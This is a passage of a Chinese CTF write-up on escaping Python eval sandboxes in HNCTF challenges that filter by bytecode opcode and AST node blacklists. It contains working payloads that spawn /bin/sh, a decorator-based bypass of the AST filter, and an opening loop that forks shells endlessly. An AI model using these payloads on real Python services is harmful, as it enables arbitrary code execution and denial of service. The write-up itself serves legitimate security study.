[os := __import__('os'), itertools := __loader__.load_module('itertools'), _posixsubprocess := __loader__.load_module('_posixsubprocess'), [_posixsubprocess.fork_exec([b"/bin/sh"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
```

![image-20241014163350018](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241014163350018.png?imageSlim)

手段也是越来越离谱

![image-20241014163427058](C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241014163427058.png)

### s@Fe safeeval

```
Warning: _curses.error: setupterm: could not find terminfo database

Terminal features will not be available.  Consider setting TERM variable to your current terminal name (or xterm).

              ______                __                     _
        ____ |  ____|              / _|                   | |
  ___  / __ \| |__ ___   ___  __ _| |_ ___  _____   ____ _| |
 / __|/ / _` |  __/ _ \ / __|/ _` |  _/ _ \/ _ \ \ / / _` | |
 \__ \ | (_| | | |  __/ \__ \ (_| | ||  __/  __/\ V / (_| | |
 |___/\ \__,_|_|  \___| |___/\__,_|_| \___|\___| \_/ \__,_|_|
       \____/                                                                                                           

Turing s@Fe mode: on
Black List:

    [
        'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP',
        'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET',
        'BUILD_CONST_KEY_MAP', 'BUILD_STRING','LOAD_CONST','RETURN_VALUE',
        'STORE_SUBSCR', 'STORE_MAP','LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE',
        'DICT_UPDATE', 'DICT_MERGE','UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT',
        'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY','BINARY_DIVIDE','BINARY_FLOOR_DIVIDE',
        'BINARY_TRUE_DIVIDE','BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT','BINARY_LSHIFT',
        'BINARY_RSHIFT','BINARY_AND','BINARY_XOR','BINARY_OR','MAKE_FUNCTION', 'CALL_FUNCTION'
    ]

some code:

    import os
    import sys
    import traceback
    import pwnlib.util.safeeval as safeeval
    input_data = input('> ')
    print(expr(input_data))
    def expr(n):
        if TURING_PROTECT_SAFE:
            m = safeeval.test_expr(n, blocklist_codes)
            return eval(m)
        else:
            return safeeval.expr(n)

> 
```

基于代码字节码的操作码来拦截

无法直接用`__import__`。类似地，也没法用`__builtins__`这些变量。

用lambda表达式包裹起一句话RCE：

```
(lambda: __import__('os').system('sh'))()
```

顺便查看一波源代码

```
import os
import sys
import traceback
import pwnlib.util.safeeval as safeeval

# https://github.com/Gallopsled/pwntools/blob/ef698d4562024802be5cc3e2fa49333c70a96662/pwnlib/util/safeeval.py#L3
_const_codes = [
    'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP',
    'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET',
    'BUILD_CONST_KEY_MAP', 'BUILD_STRING',
    'LOAD_CONST','RETURN_VALUE','STORE_SUBSCR', 'STORE_MAP',
    'LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE', 'DICT_UPDATE', 'DICT_MERGE',
    ]

_expr_codes = _const_codes + [
    'UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT',
    'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY',
    'BINARY_DIVIDE','BINARY_FLOOR_DIVIDE','BINARY_TRUE_DIVIDE',
    'BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT',
    'BINARY_LSHIFT','BINARY_RSHIFT','BINARY_AND','BINARY_XOR',
    'BINARY_OR',
    ]

blocklist_codes = _expr_codes + ['MAKE_FUNCTION', 'CALL_FUNCTION']

TURING_PROTECT_SAFE = True

banned = '''
    [
        'POP_TOP','ROT_TWO','ROT_THREE','ROT_FOUR','DUP_TOP',
        'BUILD_LIST','BUILD_MAP','BUILD_TUPLE','BUILD_SET',
        'BUILD_CONST_KEY_MAP', 'BUILD_STRING','LOAD_CONST','RETURN_VALUE',
        'STORE_SUBSCR', 'STORE_MAP','LIST_TO_TUPLE', 'LIST_EXTEND', 'SET_UPDATE',
        'DICT_UPDATE', 'DICT_MERGE','UNARY_POSITIVE','UNARY_NEGATIVE','UNARY_NOT',
        'UNARY_INVERT','BINARY_POWER','BINARY_MULTIPLY','BINARY_DIVIDE','BINARY_FLOOR_DIVIDE',
        'BINARY_TRUE_DIVIDE','BINARY_MODULO','BINARY_ADD','BINARY_SUBTRACT','BINARY_LSHIFT',
        'BINARY_RSHIFT','BINARY_AND','BINARY_XOR','BINARY_OR','MAKE_FUNCTION', 'CALL_FUNCTION'
    ]
'''

code = '''
    import os
    import sys
    import traceback
    import pwnlib.util.safeeval as safeeval
    input_data = input('> ')
    print(expr(input_data))
    def expr(n):
        if TURING_PROTECT_SAFE:
            m = safeeval.test_expr(n, blocklist_codes)
            return eval(m)
        else:
            return safeeval.expr(n)
'''

WELCOME = '''
              ______                __                     _
        ____ |  ____|              / _|                   | |
  ___  / __ \| |__ ___   ___  __ _| |_ ___  _____   ____ _| |
 / __|/ / _` |  __/ _ \ / __|/ _` |  _/ _ \/ _ \ \ / / _` | |
 \__ \ | (_| | | |  __/ \__ \ (_| | ||  __/  __/\ V / (_| | |
 |___/\ \__,_|_|  \___| |___/\__,_|_| \___|\___| \_/ \__,_|_|
       \____/                                                                                                           
'''


def expr(n):
    if TURING_PROTECT_SAFE:
        m = safeeval.test_expr(n, blocklist_codes)
        return eval(m)
    else:
        return safeeval.expr(n)

try:
    print(WELCOME)
    print('Turing s@Fe mode:', 'on' if TURING_PROTECT_SAFE else 'off')
    print('Black List:')
    print(banned)
    print('some code:')
    print(code)
    while True:
        input_data = input('> ')
        try:
            print(expr(input_data))
        except Exception as err:
            traceback.print_exc(file=sys.stdout)
except EOFError as input_data:
    print()
```

在github连接中，查看test_expr的定义

```
def test_expr(expr, allowed_codes):
    """test_expr(expr, allowed_codes) -> codeobj
    Test that the expression contains only the listed opcodes.
    If the expression is valid and contains only allowed codes,
    return the compiled code object. Otherwise raise a ValueError
    """
    import dis
    allowed_codes = [dis.opmap[c] for c in allowed_codes if c in dis.opmap]
    try:
        c = compile(expr, "", "eval")
    except SyntaxError:
        raise ValueError("%r is not a valid expression" % expr)
    codes = _get_opcodes(c)
    for code in codes:
        if code not in allowed_codes:
            raise ValueError("opcode %s not allowed" % dis.opname[code])
    return c

def _get_opcodes(codeobj):
    """_get_opcodes(codeobj) -> [opcodes]
    Extract the actual opcodes as a list from a code object
    >>> c = compile("[1 + 2, (1,2)]", "", "eval")
    >>> _get_opcodes(c)
    [100, 100, 103, 83]
    """
    import dis
    if hasattr(dis, 'get_instructions'):
        return [ins.opcode for ins in dis.get_instructions(codeobj)]
    i = 0
    opcodes = []
    s = codeobj.co_code
    while i < len(s):
        code = six.indexbytes(s, i)
        opcodes.append(code)
        if code >= dis.HAVE_ARGUMENT:
            i += 3
        else:
            i += 1
    return opcodes
```

我们的payload被解析出来的操作码：

```text
LOAD_CONST
LOAD_CONST
MAKE_FUNCTION
CALL_FUNCTION
RETURN_VALUE
```

都在题目所给的`Black List`里面

### calc_jail_beginner_level7

```
TERM environment variable not set.


    _       _ _   _                _                         _                _ ______
   (_)     (_) | | |              (_)                       | |              | |____  |
    _  __ _ _| | | |__   ___  __ _ _ _ __  _ __   ___ _ __  | | _____   _____| |   / /
   | |/ _` | | | | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__| | |/ _ \ \ / / _ \ |  / /
   | | (_| | | | | |_) |  __/ (_| | | | | | | | |  __/ |    | |  __/\ V /  __/ | / /
   | |\__,_|_|_| |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|    |_|\___| \_/ \___|_|/_/
  _/ |                        __/ |
 |__/                        |___/


=================================================================================================
==           Welcome to the calc jail beginner level7,It's AST challenge                       ==
==           Menu list:                                                                        ==
==             [G]et the blacklist AST                                                         ==
==             [E]xecute the python code                                                       ==
==             [Q]uit jail challenge                                                           ==
=================================================================================================
G
=================================================================================================
==        Black List AST:                                                                      ==
==                       'Import,ImportFrom,Call,Expr,Add,Lambda,FunctionDef,AsyncFunctionDef  ==
==                        Sub,Mult,Div,Del'                                                    ==
=================================================================================================
Press any key to continue
```

根据python抽象语法树（AST）来拦截输入的

知识盲区了，目前只能照抄：

> 我们试着输入`1+1`：
>
> ```text
> E
> Pls input your code: (last line must contain only --HNCTF)
> 1+1
> --HNCTF
> ERROR: Banned statement <ast.Expr object at 0x7f6c147ff6d0>
> Press any key to continue
> ```
>
> 发现的确ban了Expr，也就是展示的确实是Black List。
>
> 不能`import`，不能定义函数，也不能用lambda表达式，但是可以执行多行代码。这个时候，我想到了类的定义。
>
> 经过一段时间的搜索，我找到了如下writeup：
>
> ```text
> https://gynvael.coldwind.pl/n/python_sandbox_escape
> # [organizers] Robin_Jadoul solution
> ```
>
> （不得不说Robin真的太强了，organizers太强了，是我难以企及的偶像……）
>
> ```py
> @exec
> @input
> class X: pass
> ```
>
> 这份代码里面只有两个[函数装饰器](https://link.zhihu.com/?target=https%3A//www.liaoxuefeng.com/wiki/1016959663602400/1017451662295584)和一个类定义，应该不包含拦截的东西。果然，输入进去之后，程序得到了结果：
>
> ```text
> E
> Pls input your code: (last line must contain only --HNCTF)
> @exec
> @input
> class X: pass
> --HNCTF
> check is passed!now the result is:
> <class '__main__.X'>
> ```
>
> 此时再输入一句话RCE的payload：
>
> ```py
> __import__('os').system('sh')
> ```
>
> 就可以拿到shell。

